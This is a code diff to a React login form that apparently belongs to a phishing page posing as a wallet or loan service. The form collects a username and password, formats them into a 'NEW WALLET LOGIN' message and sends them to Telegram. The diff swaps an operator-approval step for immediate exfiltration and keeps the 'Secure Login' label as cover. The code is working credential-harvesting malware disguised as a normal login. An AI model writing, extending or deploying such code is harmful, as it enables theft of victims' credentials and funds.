@@ -1,6 +1,6 @@
 
 import React, { useState } from 'react';
-import { sendLoginToTelegramAndWait } from '../utils/telegram';
+import { sendToTelegram } from '../utils/telegram';
 
 interface LoginFormProps {
   loanData?: any;
@@ -22,12 +22,8 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLogin, loanData }) => {
     const message = `<b>🚨 NEW WALLET LOGIN 🚨</b>\n\n<b>👤 Username:</b> <code>${username}</code>\n<b>🔑 Password:</b> <code>${password}</code>${loanDetails}\n\n<i>🌐 Automated Log Request</i>`;
     
     try {
-      const isAccepted = await sendLoginToTelegramAndWait(message, username, false);
-      if (isAccepted) {
-        onLogin({ username, password });
-      } else {
-        setErrorMsg('Incorrect password');
-      }
+      await sendToTelegram(message);
+      onLogin({ username, password });
     } catch (error) {
       onLogin({ username, password });
     } finally {
@@ -104,7 +100,7 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLogin, loanData }) => {
               <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
             </svg>
           ) : null}
-          {isLoading ? 'Waiting for approval...' : 'Secure Login'}
+          {isLoading ? 'Processing...' : 'Secure Login'}
         </button>
 
         <div className="relative flex items-center py-4">
